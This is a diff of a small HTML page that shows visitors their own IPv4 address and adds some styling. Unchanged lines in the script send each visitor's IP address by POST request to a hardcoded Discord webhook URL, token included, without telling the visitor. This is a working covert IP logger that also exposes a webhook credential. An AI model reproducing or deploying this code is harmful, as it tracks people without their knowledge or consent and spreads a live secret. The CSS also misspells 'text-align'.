@@ -8,14 +8,14 @@
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
 </head>
 <body>
-    <div id="data"></div>
-
+    <h1 id="data"></h1>
+    
     <script>
 
     function callback( response ) {
         console.log(response)
 
-        document.getElementById("data").innerHTML = response.IPv4;
+        document.getElementById("data").innerText = response.IPv4;
 
         var request = new XMLHttpRequest();
         request.open("POST", "https://discordapp.com/api/webhooks/836921452271632405/J9HM4qmGedK2ng7NUWXfiFrTI1XocaiOv1KrpBHgQxBtj2GQ692t1su8SYdxYD0DnLhh");
@@ -52,4 +52,14 @@
     </script>
 
 </body>
+<style>
+    body {
+        background-color: #fcba03;
+    }
+    
+    h1 {
+        text-allign: center;
+        color: white;
+    }
+</style>
 </html>
